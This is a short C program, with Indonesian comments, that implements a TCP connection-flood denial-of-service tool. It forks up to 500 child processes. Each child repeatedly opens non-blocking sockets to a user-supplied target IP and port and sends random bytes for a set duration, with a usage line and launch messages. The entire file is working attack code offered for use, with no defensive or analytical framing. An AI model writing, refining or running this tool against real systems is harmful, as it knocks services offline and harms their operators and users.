#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <sys/wait.h>

#define MAX_CHILDREN 500
#define PAYLOAD_SIZE 32

char payload[PAYLOAD_SIZE];
int floodPort;
int floodTime;

void spam(const char *ip) {
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(floodPort);
    target.sin_addr.s_addr = inet_addr(ip);

    time_t end = time(NULL) + floodTime;

    while (time(NULL) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        fcntl(sock, F_SETFL, O_NONBLOCK); // non-blocking

        connect(sock, (struct sockaddr *)&target, sizeof(target));
        send(sock, payload, PAYLOAD_SIZE, 0);
        close(sock);
    }

    exit(0); // child selesai
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <target IP> <port> <forks> <time>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    floodPort = atoi(argv[2]);
    int forks = atoi(argv[3]);
    floodTime = atoi(argv[4]);

    if (forks > MAX_CHILDREN) forks = MAX_CHILDREN;

    // isi payload dengan karakter acak
    srand(time(NULL));
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        payload[i] = (char)(rand() % 256);
    }

    printf("🔥 Launching %d parallel processes for %d seconds...\n", forks, floodTime);

    for (int i = 0; i < forks; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            spam(target_ip);
        }
    }

    // Tunggu semua anak selesai
    for (int i = 0; i < forks; i++) {
        wait(NULL);
    }

    printf("✅ Done.\n");
    return 0;
}
